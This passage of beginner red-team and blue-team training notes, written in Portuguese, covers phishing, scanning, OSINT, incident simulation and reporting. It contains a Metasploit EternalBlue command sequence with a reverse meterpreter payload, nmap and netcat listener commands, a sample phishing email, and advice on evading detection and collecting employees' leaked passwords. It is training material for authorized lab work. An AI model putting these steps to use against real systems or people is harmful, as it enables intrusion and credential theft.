+Praticar o desenho de arquiteturas simples e seguras ajuda o Blue Team N1 a consolidar fundamentos e preparar defesas eficazes. A clareza e organização na rede são pilares para uma boa postura de segurança.
+
+---
+
+ 🔴 Red Team N1: Técnicas Ofensivas Básicas – Phishing, Engenharia Social, Scanning e Exploits Simples
+
+No início da jornada no Red Team, é fundamental entender e praticar as técnicas ofensivas básicas. Essas habilidades são a base para ataques mais sofisticados e ajudam a compreender as fragilidades que podem ser exploradas em qualquer ambiente.
+
+---
+
+ 🧠 Visão geral das técnicas
+
+- **Phishing:** Enganar usuários para obter credenciais ou informações sensíveis  
+- **Engenharia Social:** Manipular pessoas para obter acesso ou informações  
+- **Scanning:** Mapear redes, hosts e serviços para identificar pontos fracos  
+- **Exploits simples:** Utilizar vulnerabilidades conhecidas para obter acesso ou executar código  
+
+---
+
+ 🧱 Técnicas detalhadas
+
+ 1. Phishing
+
+- Envio de e-mails ou mensagens fraudulentas com links ou anexos maliciosos  
+- Uso de páginas falsas (fake login) para capturar dados  
+- Testar awareness dos usuários com campanhas simuladas  
+
+```
+
+Exemplo básico de e-mail phishing:
+
+Assunto: Atualização urgente da senha  
+Corpo: "Olá, seu acesso foi bloqueado. Clique no link para redefinir: http://fakesite.com"
+
+```
+
+---
+
+ 2. Engenharia Social
+
+- Ligação ou conversa para obter informações confidenciais  
+- Fingir ser um técnico, suporte ou colega para ganhar confiança  
+- Explorar fraquezas humanas, como curiosidade ou medo  
+
+---
+
+ 3. Scanning
+
+- Utilizar ferramentas como `nmap` para descobrir hosts e portas abertas  
+- Identificar sistemas operacionais e serviços em execução  
+- Detectar vulnerabilidades iniciais para exploração  
+
+```
+
+Comando básico:
+
+```
+nmap -sS -p 1-1000 192.168.1.0/24
+```
+
+---
+
+ 4. Exploits Simples
+
+- Utilizar vulnerabilidades conhecidas com ferramentas ou scripts prontos  
+- Explorar falhas de software desatualizado ou configurações incorretas  
+- Exemplo: uso do Metasploit para explorar vulnerabilidade SMB  
+
+---
+
+ ⚙️ Dicas para o Red Team N1
+
+- Pratique sempre em ambientes controlados e autorizados  
+- Entenda o impacto e as consequências de cada técnica  
+- Documente seus passos para análise posterior e melhoria  
+- Combine técnicas para aumentar a eficácia dos ataques  
+
+---
+
+ ✅ Conclusão
+
+Dominar técnicas ofensivas básicas é essencial para o Red Team N1 criar uma base sólida e se preparar para desafios mais complexos. Com prática e estudo, é possível evoluir e contribuir efetivamente para o ciclo de segurança.
+
+---
+
+ 🔴 Red Team N1: Ferramentas Básicas – nmap e Metasploit
+
+Para começar no Red Team, dominar ferramentas essenciais como **nmap** e **Metasploit** é fundamental. Elas permitem realizar reconhecimento, exploração e post-exploração em ambientes controlados, preparando você para ataques mais complexos.
+
+---
+
+ 🧠 Por que usar essas ferramentas?
+
+- **nmap:** Scanner de redes para mapear hosts, portas abertas e serviços  
+- **Metasploit:** Framework para exploração de vulnerabilidades e criação de payloads  
+- Ambas são amplamente usadas por profissionais e facilitam a automação de ataques  
+
+---
+
+ 🧱 Ferramenta 1: nmap
+
+- Permite descobrir dispositivos e serviços ativos na rede  
+- Detecta sistemas operacionais e versões de software  
+- Suporta varreduras rápidas e detalhadas  
+
+```
+
+Exemplo básico:
+
+```
+nmap -sS -p 1-1000 192.168.1.0/24
+```
+
+---
+
+ 🧱 Ferramenta 2: Metasploit Framework
+
+- Plataforma para desenvolvimento e execução de exploits  
+- Contém módulos para scanners, payloads, pós-exploração e mais  
+- Pode ser usada via interface gráfica (`msfconsole`) ou scripts  
+
+```
+
+Comandos iniciais:
+
+```
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.50
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+exploit
+```
+
+---
+
+ ⚙️ Dicas para iniciantes
+
+- Sempre use em ambientes autorizados e de teste  
+- Combine nmap para reconhecimento e Metasploit para exploração  
+- Estude cada módulo do Metasploit para entender seu funcionamento  
+- Documente suas atividades para aprendizado e segurança  
+
+---
+
+ ✅ Conclusão
+
+nmap e Metasploit são ferramentas pilares para o Red Team N1. Dominar seu uso básico abre portas para técnicas ofensivas mais avançadas e consolida a base para seu crescimento na área.
+
+---
+
+ 🔴 Red Team N1: Prática – Executar Scan Básico e Entender o Impacto na Defesa
+
+Realizar scans de rede é um dos primeiros passos para reconhecimento em testes ofensivos. Porém, é importante compreender como essa atividade pode ser percebida e respondida pelo Blue Team, para ajustar táticas e evitar detecção precoce.
+
+---
+
+ 🧠 Objetivo da prática
+
+- Executar um scan básico usando nmap  
+- Observar os logs e alertas gerados nos sistemas de defesa  
+- Entender como o Blue Team pode detectar e reagir a esses scans  
+
+---
+
+ 🧱 Ferramentas necessárias
+
+- Máquina com nmap instalado (ex: Kali Linux)  
+- Ambiente de laboratório com firewall, IDS/IPS e SIEM (ex: Security Onion)  
+- Acesso aos logs de segurança para análise  
+
+---
+
+ 🔍 Passo a passo do scan básico
+
+```
+
+ Executar scan SYN nas portas mais comuns na rede alvo
+nmap -sS -p 1-1000 192.168.1.100
+
+```
+
+- Use o parâmetro `-sS` para scan furtivo (SYN scan)  
+- Alvo: IP do host que será analisado  
+- Observe os resultados: portas abertas, serviços e versões  
+
+---
+
+ 🔍 Observando o impacto na defesa
+
+```
+
+ No ambiente Blue Team, verifique:
+- Logs de firewall para tentativas de conexão  
+- Alertas no IDS/IPS indicando comportamento suspeito  
+- Notificações e correlações no SIEM  
+- Acionamento de playbooks de resposta automatizada (se houver)  
+```
+
+---
+
+ ⚙️ Discussão
+
+- Scans podem ser detectados como atividades suspeitas ou ataques pré-ativos  
+- Blue Team pode bloquear IPs, gerar alertas e iniciar investigações  
+- Técnicas de evasão podem ser usadas para reduzir a detecção (ex: timing, fragmentação)  
+
+---
+
+ ✅ Conclusão
+
+Executar scans é essencial para o Red Team, mas entender como a defesa reage é igualmente importante para ajustar estratégias e evitar bloqueios precoces. Essa prática ajuda a equilibrar agressividade e furtividade nos testes.
+
+---
+
+ 🔵 Blue Team N1: Participar ou Criar Exercícios de Simulação de Incidentes (Phishing, Ransomware)
+
+Exercícios de simulação são ferramentas poderosas para preparar equipes para incidentes reais. Eles ajudam a validar processos, identificar gaps e melhorar a colaboração entre times. No Blue Team N1, participar e criar esses exercícios é fundamental para aprimorar a resposta a ameaças.
+
+---
+
+ 🧠 Por que simular incidentes?
+
+- Treinar a equipe em um ambiente controlado  
+- Avaliar a eficácia das políticas e ferramentas  
+- Melhorar a comunicação e coordenação entre áreas  
+- Detectar falhas e pontos de melhoria  
+
+---
+
+ 🧱 Tipos comuns de simulações
+
+ 1. Phishing
+
+- Envio de e-mails simulados para testar a conscientização dos usuários  
+- Monitoramento das interações e respostas  
+- Treinamento com feedback e reforço positivo  
+
+---
+
+ 2. Ransomware
+
+- Simulação de ataque para testar resposta e recuperação  
+- Avaliação de backup, isolamento e comunicação  
+- Teste da eficácia do playbook de resposta a incidentes  
+
+---
+
+ 🔍 Como criar um exercício simples
+
+```
+
+1. Defina o objetivo do exercício (ex: testar resposta a phishing)  
+2. Planeje o cenário e a duração  
+3. Prepare os recursos (e-mails simulados, artefatos, alertas falsos)  
+4. Envolva todas as partes interessadas (TI, comunicação, gestão)  
+5. Execute a simulação com monitoramento e suporte  
+6. Realize um debrief para analisar resultados e lições aprendidas  
+
+```
+
+---
+
+ ⚙️ Boas práticas
+
+```
+
+- Garanta que o exercício não cause impactos reais nos sistemas  
+- Comunique a liderança sobre a simulação para apoio  
+- Use ferramentas especializadas para envio e monitoramento  
+- Documente o processo e os resultados para melhoria contínua  
+
+```
+
+---
+
+ ✅ Benefícios para o Blue Team
+
+- Melhora a prontidão e capacidade de resposta  
+- Fortalece a cultura de segurança na organização  
+- Reduz o tempo de detecção e mitigação de incidentes  
+- Facilita a identificação de falhas em processos e tecnologias  
+
+---
+
+ ✅ Conclusão
+
+Exercícios de simulação são essenciais para o desenvolvimento do Blue Team N1. Eles transformam teoria em prática, preparando a equipe para enfrentar ameaças reais com confiança e eficiência.
+
+---
+
+ 🔵 Blue Team N1: Analisar Respostas e Identificar Pontos de Melhoria
+
+Analisar as respostas a incidentes é fundamental para aprimorar a segurança e aumentar a eficácia da equipe. Para o Blue Team N1, esse processo permite entender onde houve falhas, otimizar procedimentos e fortalecer a defesa.
+
+---
+
+ 🧠 Por que analisar respostas?
+
+- Avaliar a eficiência das ações tomadas  
+- Detectar gargalos e atrasos no processo  
+- Identificar falhas técnicas e humanas  
+- Gerar aprendizado contínuo para prevenção  
+
+---
+
+ 🧱 Passos para análise eficaz
+
+```
+
+1. Coletar evidências e registros do incidente  
+2. Revisar o timeline das ações realizadas  
+3. Avaliar o cumprimento dos playbooks e procedimentos  
+4. Entrevistar envolvidos para entender dificuldades  
+5. Mapear causas raízes dos problemas detectados  
+6. Priorizar pontos de melhoria com base no impacto  
+
+```
+
+---
+
+ 🔍 Exemplos comuns de pontos de melhoria
+
+- Tempo excessivo para detecção ou contenção  
+- Falta de automação em tarefas repetitivas  
+- Comunicação ineficiente entre equipes  
+- Gaps no treinamento e conscientização  
+- Deficiências em ferramentas ou infraestrutura  
+
+---
+
+ ⚙️ Como implementar melhorias
+
+```
+
+- Atualizar e testar playbooks e runbooks regularmente  
+- Investir em treinamentos e simulações frequentes  
+- Automatizar processos sempre que possível  
+- Melhorar canais e processos de comunicação  
+- Revisar e otimizar arquitetura e ferramentas de segurança  
+
+```
+
+---
+
+ ✅ Benefícios para o Blue Team
+
+- Respostas mais rápidas e eficazes a incidentes  
+- Redução do impacto e tempo de inatividade  
+- Maior confiança e preparo da equipe  
+- Evolução constante da postura de segurança  
+
+---
+
+ ✅ Conclusão
+
+Analisar respostas e identificar pontos de melhoria são práticas essenciais para o crescimento do Blue Team N1. Essa cultura de aprendizado contínuo fortalece a segurança da organização e prepara o time para novos desafios.
+
+---
+
+ 🔵 Blue Team N1: Prática – Montar Relatório e Lições Aprendidas Após o Simulado
+
+A elaboração de relatórios detalhados e a documentação das lições aprendidas são etapas fundamentais para garantir o aprimoramento contínuo da equipe e da segurança da organização. Após um exercício simulado, esse processo ajuda a consolidar conhecimentos e ajustar estratégias.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Documentar todo o fluxo do simulado  
+- Identificar sucessos e falhas durante o exercício  
+- Registrar recomendações e ações para melhoria  
+
+---
+
+ 🧱 Estrutura básica do relatório
+
+```
+
+1. **Introdução**  
+   - Objetivo do simulado  
+   - Data e participantes  
+
+2. **Descrição do cenário**  
+   - Tipo de ataque simulado (phishing, ransomware, etc.)  
+   - Ferramentas e técnicas usadas  
+
+3. **Cronograma e execução**  
+   - Sequência das ações e respostas  
+   - Tempo gasto em cada etapa  
+
+4. **Análise dos resultados**  
+   - Pontos fortes identificados  
+   - Falhas e dificuldades encontradas  
+
+5. **Lições aprendidas**  
+   - Recomendações para melhorias técnicas e de processos  
+   - Sugestões para treinamentos futuros  
+
+6. **Conclusão**  
+   - Resumo do impacto do simulado  
+   - Próximos passos  
+
+```
+
+---
+
+ 🔍 Dicas para elaboração
+
+```
+
+- Seja claro e objetivo na escrita  
+- Use gráficos e tabelas para facilitar a visualização  
+- Inclua evidências relevantes (logs, capturas de tela)  
+- Envolva todos os participantes na revisão do relatório  
+
+```
+
+---
+
+ ⚙️ Benefícios do relatório
+
+- Facilita a comunicação com a gestão e outras áreas  
+- Serve como base para aprimorar a postura de segurança  
+- Permite comparar resultados em simulados futuros  
+- Fortalece a cultura de aprendizado e melhoria contínua  
+
+---
+
+ ✅ Conclusão
+
+Montar um relatório detalhado com lições aprendidas é uma prática essencial para o Blue Team N1. Esse documento orienta a evolução da equipe e da organização, transformando experiências em conhecimento valioso.
+
+---
+
+ 🔵 Blue Team N1: Revisar Conceitos Essenciais de Segurança da Informação
+
+Revisar os conceitos fundamentais de segurança da informação é crucial para garantir uma base sólida no desenvolvimento das habilidades do Blue Team. Esses conceitos orientam práticas e decisões diárias para proteger ativos e dados.
+
+---
+
+ 🧠 Conceitos básicos
+
+```
+
+- **Confidencialidade:** Garantir que informações sejam acessadas somente por pessoas autorizadas  
+- **Integridade:** Assegurar que dados e sistemas não sejam alterados indevidamente  
+- **Disponibilidade:** Garantir que sistemas e dados estejam acessíveis quando necessários  
+```
+
+---
+
+ 🧱 Outros conceitos importantes
+
+```
+
+- **Autenticidade:** Confirmar a identidade de usuários e sistemas  
+- **Não-repúdio:** Garantir que ações ou transações não possam ser negadas posteriormente  
+- **Accountability:** Responsabilização e registro de ações realizadas no sistema  
+---
+
+ 🔍 Princípios fundamentais
+
+- **Defesa em profundidade:** Múltiplas camadas de segurança para aumentar proteção  
+- **Menor privilégio:** Conceder apenas os acessos estritamente necessários  
+- **Segurança por design:** Incorporar segurança desde o planejamento e desenvolvimento  
+```
+
+---
+
+ ⚙️ Aplicação prática
+
+```
+
+- Implementar controles de acesso e autenticação fortes  
+- Monitorar e auditar atividades para detectar anomalias  
+- Planejar backups e redundância para garantir disponibilidade  
+- Treinar usuários para evitar falhas humanas  
+
+```
+
+---
+
+ ✅ Conclusão
+
+Revisar e reforçar os conceitos essenciais de segurança da informação ajuda o Blue Team N1 a manter uma postura sólida e alinhada com as melhores práticas, tornando a defesa mais eficiente e confiável.
+
+---
+
+ 🔴 Red Team N1: Introdução ao Red Team – Objetivos, Metodologia e Ciclo de Ataque
+
+O Red Team é fundamental para testar a segurança de uma organização, simulando ataques reais para identificar vulnerabilidades e fortalecer as defesas. No nível N1, entender seus objetivos, metodologia e o ciclo de ataque é essencial para começar a atuar com eficácia.
+
+---
+
+ 🧠 Objetivos do Red Team
+
+```
+
+- Avaliar a postura de segurança de forma realista  
+- Identificar vulnerabilidades técnicas, físicas e humanas  
+- Testar a capacidade de detecção e resposta do Blue Team  
+- Gerar recomendações para melhorar a segurança geral  
+```
+
+---
+
+ 🧱 Metodologia básica
+
+```
+
+1. **Reconhecimento:** Coleta de informações sobre o alvo (aberta e passiva)  
+2. **Enumeração:** Mapeamento detalhado de sistemas, serviços e usuários  
+3. **Exploração:** Uso de vulnerabilidades para ganhar acesso  
+4. **Escalada de privilégios:** Obter níveis mais altos de controle  
+5. **Movimentação lateral:** Explorar rede para atingir objetivos  
+6. **Persistência:** Manter acesso no ambiente comprometido  
+7. **Exfiltração:** Coleta e extração de dados sensíveis (quando aplicável)  
+```
+
+---
+
+ 🔍 Ciclo de ataque simplificado
+
+```
+
+ Reconhecimento → Enumeração → Exploração → Pós-exploração → Relatório  
+```
+
+---
+
+ ⚙️ Dicas para iniciantes
+
+```
+
+- Sempre tenha autorização e execute testes em ambientes controlados  
+- Documente todas as etapas para aprendizado e melhorias  
+- Combine técnicas manuais e automatizadas  
+- Estude ferramentas essenciais para cada fase do ciclo  
+
+```
+
+---
+
+ ✅ Conclusão
+
+Conhecer os objetivos, metodologia e ciclo de ataque do Red Team é o primeiro passo para construir uma carreira sólida em segurança ofensiva. Essa base prepara o profissional para enfrentar desafios reais com ética e competência.
+
+---
+
+ 🔴 Red Team N1: Ambiente de Laboratório com Kali Linux e Máquinas Alvo (Windows, Linux)
+
+Montar um laboratório prático é essencial para desenvolver habilidades no Red Team. Usar Kali Linux como plataforma ofensiva e máquinas alvo com Windows e Linux permite simular ataques reais em ambiente seguro e controlado.
+
+---
+
+ 🧠 Por que montar um laboratório?
+
+```
+
+- Praticar técnicas sem riscos legais  
+- Testar ferramentas e exploits em ambientes reais  
+- Entender o comportamento dos sistemas alvo  
+- Desenvolver e validar procedimentos de ataque e defesa  
+```
+
+---
+
+ 🧱 Componentes do laboratório
+
+```
+
+- **Kali Linux:** Distribuição focada em segurança ofensiva com centenas de ferramentas pré-instaladas  
+- **Máquinas alvo:** Sistemas Windows e Linux configurados para simular vulnerabilidades e cenários reais  
+- **Rede isolada:** Ambiente separado da rede produtiva para segurança e controle  
+- **Ferramentas de virtualização:** VMware, VirtualBox, Proxmox ou similares para criar e gerenciar VMs  
+```
+
+---
+
+ 🔍 Passos para montar o laboratório
+
+```
+
+1. Instale a ferramenta de virtualização no seu computador  
+2. Baixe e configure a VM do Kali Linux  
+3. Configure VMs alvo com Windows (ex: Windows 10/Server) e Linux (ex: Ubuntu, CentOS)  
+4. Conecte as máquinas em uma rede interna ou host-only para isolamento  
+5. Configure snapshots para restaurar rapidamente o ambiente  
+6. Teste a comunicação entre as máquinas (ping, SSH, RDP)  
+```
+
+---
+
+ ⚙️ Dicas para o Red Team N1
+
+```
+
+- Use versões desatualizadas ou configuradas com vulnerabilidades para prática  
+- Documente configurações e topologia da rede  
+- Atualize ferramentas e mantenha o ambiente organizado  
+- Explore ferramentas de captura de tráfego (Wireshark) e monitoramento  
+```
+
+---
+
+ ✅ Benefícios do laboratório
+
+- Ambiente seguro para experimentar sem riscos  
+- Aprendizado prático e aprofundado  
+- Preparação para testes em ambientes reais  
+- Desenvolvimento da confiança e habilidades técnicas  
+
+---
+
+ ✅ Conclusão
+
+Ter um laboratório com Kali Linux e máquinas alvo Windows/Linux é fundamental para o crescimento do Red Team N1. Esse ambiente facilita a prática, o estudo e o aprimoramento das técnicas ofensivas com segurança.
+
+---
+
+ 🔴 Red Team N1: Ferramentas Básicas – nmap, netcat e Enumeração de Serviços
+
+Para iniciar no Red Team, conhecer e dominar ferramentas básicas como **nmap**, **netcat** e técnicas de enumeração de serviços é essencial. Essas ferramentas permitem coletar informações valiosas e preparar o terreno para ataques mais complexos.
+
+---
+
+ 🧠 Por que usar essas ferramentas?
+
+- **nmap:** Scanner de rede para descobrir hosts, portas e serviços  
+- **netcat:** Utilitário versátil para comunicação TCP/UDP e testes de portas  
+- **Enumeração de serviços:** Processo de identificar versões e configurações para encontrar vulnerabilidades  
+
+---
+
+ 🧱 Ferramenta 1: nmap
+
+```
+
+- Realiza scans rápidos e detalhados  
+- Detecta sistemas operacionais e versões de serviços  
+- Suporta scripts para automação e exploração  
+
+```
+
+Exemplo básico:
+
+```
+
+nmap -sS -p 1-1000 192.168.1.100
+
+```
+
+---
+
+ 🧱 Ferramenta 2: netcat (nc)
+
+```
+
+- Conecta a portas TCP/UDP para teste e comunicação  
+- Pode atuar como listener ou cliente  
+- Útil para transferência de arquivos e criação de backdoors simples  
+
+```
+
+Exemplos:
+
+```
+
+ Escutar na porta 4444  
+nc -lvp 4444
+
+ Conectar a um host na porta 80  
+nc 192.168.1.100 80
+
+```
+
+---
+
+ 🔍 Enumeração de serviços
+
+```
+
+- Após descobrir portas abertas com nmap, use ferramentas específicas para identificar serviços  
+- Exemplos:  
+  - `ftp` para testar servidores FTP  
+  - `smtp` para servidores de e-mail  
+  - `rpcinfo` para serviços RPC  
+- Essa etapa ajuda a encontrar versões vulneráveis ou mal configuradas  
+
+```
+
+---
+
+ ⚙️ Dicas para iniciantes
+
+```
+
+- Combine nmap e netcat para reconhecimento ativo e passivo  
+- Use scripts do nmap (`-sC`) para automatizar enumeração  
+- Documente as descobertas para análises futuras  
+- Pratique sempre em ambientes autorizados e controlados  
+
+```
+
+---
+
+ ✅ Conclusão
+
+Dominar nmap, netcat e técnicas de enumeração é fundamental para qualquer Red Team N1. Essas ferramentas são a base para coletar informações e planejar ataques eficazes com maior segurança e precisão.
+
+---
+
+ 🔴 Red Team N1: Prática – Escanear Rede e Mapear Ativos
+
+Realizar o mapeamento da rede e identificação dos ativos é um passo fundamental para o Red Team. Essa prática ajuda a entender o ambiente, identificar possíveis alvos e planejar ataques de forma mais precisa.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Descobrir hosts ativos na rede  
+- Identificar portas abertas e serviços em execução  
+- Mapear sistemas operacionais e versões  
+- Criar um inventário inicial para análise posterior  
+
+---
+
+ 🧱 Ferramentas necessárias
+
+```
+
+- **nmap** instalado em uma máquina Linux ou Windows  
+- Rede ou ambiente de laboratório configurado para testes  
+```
+
+---
+
+ 🔍 Passo a passo para escanear e mapear ativos
+
+```
+
+1. **Descobrir hosts ativos (ping sweep):**  
+   nmap -sn 192.168.1.0/24
+
+2. **Escanear portas comuns nos hosts ativos:**  
+   nmap -sS -p 1-1000 192.168.1.0/24
+
+3. **Detectar serviços e versões:**  
+   nmap -sV 192.168.1.100
+
+4. **Identificar sistema operacional:**  
+   nmap -O 192.168.1.100
+
+```
+
+---
+
+ ⚙️ Observações importantes
+
+```
+
+- Execute scans com permissão e em ambientes controlados  
+- Use opções de timing para ajustar velocidade e evitar detecção  
+- Documente os resultados para referência futura  
+- Combine com outras ferramentas para aprofundar a enumeração  
+
+```
+
+---
+
+ ✅ Conclusão
+
+Escanear a rede e mapear ativos é uma prática básica e crucial para o Red Team N1. Essa atividade fornece informações essenciais para planejar ataques e testar defesas com maior eficiência.
+
+---
+
+ 🔴 Red Team N1: Técnicas de Reconhecimento Passivo e Ativo
+
+O reconhecimento é a fase inicial de qualquer operação de Red Team, onde coletamos informações para planejar ataques. Entender as diferenças entre técnicas passivas e ativas é fundamental para agir com eficiência e segurança.
+
+---
+
+ 🧠 Reconhecimento Passivo
+
+```
+
+- Coleta de informações sem interação direta com o alvo  
+- Não gera alertas ou logs no ambiente alvo  
+- Exemplos:  
+  - Pesquisa em fontes públicas (OSINT)  
+  - Consulta a bancos de dados WHOIS e DNS  
+  - Análise de redes sociais e sites corporativos  
+  - Uso de ferramentas como Shodan, Google Dorks  
+
+---
+
+ 🧱 Benefícios do reconhecimento passivo
+
+```
+
+- Mantém o anonimato e reduz chances de detecção  
+- Permite levantamento amplo de informações iniciais  
+- Fundamenta o planejamento das etapas seguintes  
+
+---
+
+ 🧠 Reconhecimento Ativo
+
+```
+
+- Envolve interação direta com o alvo  
+- Pode gerar logs e alertas em sistemas de defesa  
+- Exemplos:  
+  - Scans de portas com nmap  
+  - Testes de vulnerabilidades e sondagens  
+  - Captura de banners e identificação de serviços  
+
+---
+
+ 🧱 Cuidados no reconhecimento ativo
+
+```
+
+- Realizar com autorização para evitar problemas legais  
+- Usar técnicas furtivas para minimizar detecção  
+- Analisar o impacto no ambiente alvo  
+- Registrar todas as ações para documentação  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Comece pelo reconhecimento passivo para coletar dados sem risco  
+- Use reconhecimento ativo para validar e aprofundar informações  
+- Combine ambas as técnicas para um panorama completo  
+- Documente tudo para planejar as próximas fases do ataque  
+
+---
+
+ ✅ Conclusão
+
+Dominar técnicas de reconhecimento passivo e ativo é essencial para qualquer profissional de Red Team N1. Essa etapa prepara o terreno para um ataque bem-sucedido, ético e eficiente.
+
+---
+
+ 🔴 Red Team N1: Ferramentas OSINT – Maltego, Recon-ng e Shodan
+
+O OSINT (Open Source Intelligence) é uma etapa crucial para o Red Team, permitindo coletar informações públicas que ajudam a mapear alvos e identificar potenciais pontos de ataque. Dominar ferramentas como Maltego, Recon-ng e Shodan é fundamental para realizar uma coleta eficaz e organizada.
+
+---
+
+ 🧠 Por que usar ferramentas OSINT?
+
+```
+
+- Automatizam a coleta de dados públicos  
+- Facilitam a correlação de informações  
+- Aceleram o reconhecimento e planejamento  
+- Reduzem o risco de detecção, pois usam fontes abertas  
+
+---
+
+ 🧱 Ferramenta 1: Maltego
+
+```
+
+- Plataforma visual para coleta e análise de dados  
+- Permite criar grafos relacionando pessoas, domínios, IPs, redes sociais, e mais  
+- Suporta integração com diversas fontes OSINT  
+- Útil para identificar conexões e padrões complexos  
+
+---
+
+ 🧱 Ferramenta 2: Recon-ng
+
+```
+
+- Framework em Python para automação de coleta OSINT  
+- Modular, com dezenas de módulos para diferentes tipos de dados  
+- Interface via linha de comando com banco de dados integrado  
+- Permite criação de workflows personalizados  
+
+---
+
+ 🧱 Ferramenta 3: Shodan
+
+```
+
+- Motor de busca para dispositivos conectados à internet  
+- Permite encontrar servidores, webcams, dispositivos IoT, entre outros  
+- Fornece informações sobre serviços, banners e vulnerabilidades conhecidas  
+- Ideal para identificar superfícies de ataque expostas  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Combine as ferramentas para obter um panorama completo  
+- Use credenciais ou APIs para ampliar a coleta quando possível  
+- Documente todas as descobertas para análise posterior  
+- Respeite limites éticos e legais durante a coleta  
+
+---
+
+ ✅ Conclusão
+
+Dominar Maltego, Recon-ng e Shodan permite ao Red Team N1 realizar uma coleta OSINT eficaz, abrindo caminho para ataques planejados e fundamentados em dados reais.
+
+---
+
+ 🔴 Red Team N1: Coleta de Dados Sobre Alvos – Domínios, IPs e Funcionários
+
+A coleta de dados é a base para qualquer operação do Red Team. Obter informações precisas sobre domínios, endereços IP e funcionários do alvo permite planejar ataques mais direcionados e eficazes.
+
+---
+
+ 🧠 Por que coletar esses dados?
+
+```
+
+- Mapear a infraestrutura digital da organização  
+- Identificar possíveis vetores de ataque  
+- Obter dados para engenharia social e phishing  
+- Construir perfis para ataques personalizados  
+
+---
+
+ 🧱 Coleta de domínios
+
+```
+
+- Consultar registros DNS para identificar subdomínios e servidores  
+- Usar ferramentas como `dig`, `nslookup`, ou serviços online  
+- Descobrir domínios relacionados e históricos  
+- Explorar certificados SSL para encontrar domínios adicionais  
+
+---
+
+ 🧱 Coleta de IPs
+
+```
+
+- Mapear blocos de IPs associados à organização  
+- Identificar servidores públicos e serviços expostos  
+- Utilizar Shodan para encontrar dispositivos conectados  
+- Monitorar alterações e movimentações na rede pública  
+
+---
+
+ 🧱 Coleta de informações sobre funcionários
+
+```
+
+- Pesquisa em redes sociais (LinkedIn, Twitter, Facebook)  
+- Identificar cargos, departamentos e relações internas  
+- Obter e-mails corporativos e possíveis senhas vazadas  
+- Utilizar ferramentas OSINT para automatizar buscas  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Utilize múltiplas fontes para validar dados  
+- Documente informações em banco ou planilha organizada  
+- Respeite limites éticos e legais durante a coleta  
+- Atualize constantemente os dados para refletir mudanças  
+
+---
+
+ ✅ Conclusão
+
+Coletar dados sobre domínios, IPs e funcionários é um passo crucial no reconhecimento do Red Team N1. Essa etapa fundamenta ataques mais precisos e aumenta a chance de sucesso nas simulações.
+
+---
+
+ 🔴 Red Team N1: Prática – Realizar Reconhecimento Completo de um Alvo Simulado
+
+O reconhecimento completo é a base para um ataque bem-sucedido. Essa prática ajuda a consolidar técnicas passivas e ativas para coletar o máximo de informações sobre um alvo simulado, preparando o terreno para as fases seguintes.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Executar reconhecimento passivo e ativo de forma integrada  
+- Mapear infraestrutura, serviços, pessoas e potenciais vulnerabilidades  
+- Documentar e organizar os dados coletados para análise  
+
+---
+
+ 🧱 Ferramentas e recursos recomendados
+
+```
+
+- **Ferramentas OSINT:** Maltego, Recon-ng, Shodan  
+- **Scanners de rede:** nmap, netcat  
+- **Consultas DNS:** dig, nslookup  
+- Ambiente de laboratório ou alvo simulado autorizado  
+
+---
+
+ 🔍 Passo a passo sugerido
+
+```
+
+1. **Reconhecimento passivo:**  
+   - Pesquisa OSINT para domínios, subdomínios, funcionários e redes sociais  
+   - Coleta de dados em bancos públicos e fontes abertas  
+
+2. **Reconhecimento ativo:**  
+   - Scans de rede com nmap para identificar hosts e portas abertas  
+   - Enumeração de serviços e versões  
+   - Testes básicos de vulnerabilidades, sem causar danos  
+
+3. **Análise e documentação:**  
+   - Organizar as informações em relatório ou planilha  
+   - Destacar potenciais pontos de ataque e estratégias  
+
+```
+
+---
+
+ ⚙️ Cuidados importantes
+
+```
+
+- Realizar todas as ações com autorização e em ambientes controlados  
+- Evitar impactos no ambiente alvo  
+- Documentar todas as etapas para aprendizado e auditoria  
+
+---
+
+ ✅ Benefícios da prática
+
+- Desenvolvimento de habilidades técnicas em múltiplas ferramentas  
+- Compreensão do processo completo de reconhecimento  
+- Preparação para fases avançadas de ataques simulados  
+- Melhoria na organização e documentação dos dados coletados  
+
+---
+
+ ✅ Conclusão
+
+Realizar um reconhecimento completo em um alvo simulado é fundamental para o Red Team N1 consolidar conhecimentos e praticar de forma segura e estruturada. Essa prática prepara o profissional para desafios reais com mais confiança e precisão.
+
+---
+
+ 🔴 Red Team N1: Conhecer as Principais Vulnerabilidades Comuns (CVE, OWASP)
+
+Entender as vulnerabilidades mais comuns é essencial para o Red Team. Isso ajuda a identificar rapidamente falhas em sistemas e aplicações, aumentando a eficiência dos testes de invasão e da exploração.
+
+---
+
+ 🧠 Principais fontes de vulnerabilidades
+
+```
+
+- **CVE (Common Vulnerabilities and Exposures):** Banco público que lista vulnerabilidades específicas em softwares, sistemas e equipamentos  
+- **OWASP (Open Web Application Security Project):** Focado em vulnerabilidades de aplicações web, publica listas como OWASP Top 10  
+
+---
+
+ 🧱 CVE – O que é importante saber
+
+```
+
+- Cada vulnerabilidade tem um identificador único (ex: CVE-2023-12345)  
+- Contém descrição, impacto, soluções e referências  
+- Usado para identificar falhas em sistemas operacionais, softwares e dispositivos  
+- Consultar CVEs ajuda a mapear possíveis alvos de exploração  
+
+---
+
+ 🧱 OWASP Top 10 – Principais vulnerabilidades web
+
+```
+
+1. **Injection** (SQL, OS, LDAP)  
+2. **Broken Authentication**  
+3. **Sensitive Data Exposure**  
+4. **XML External Entities (XXE)**  
+5. **Broken Access Control**  
+6. **Security Misconfiguration**  
+7. **Cross-Site Scripting (XSS)**  
+8. **Insecure Deserialization**  
+9. **Using Components with Known Vulnerabilities**  
+10. **Insufficient Logging & Monitoring**  
+
+---
+
+ 🔍 Como usar esse conhecimento no Red Team
+
+```
+
+- Identificar se o alvo está vulnerável a CVEs conhecidos  
+- Priorizar testes baseados nas vulnerabilidades mais críticas  
+- Usar exploits públicos disponíveis para acelerar a exploração  
+- Avaliar controles e defesas contra falhas comuns da OWASP  
+
+---
+
+ ⚙️ Dicas para iniciantes
+
+```
+
+- Acompanhe atualizações periódicas de CVEs e OWASP  
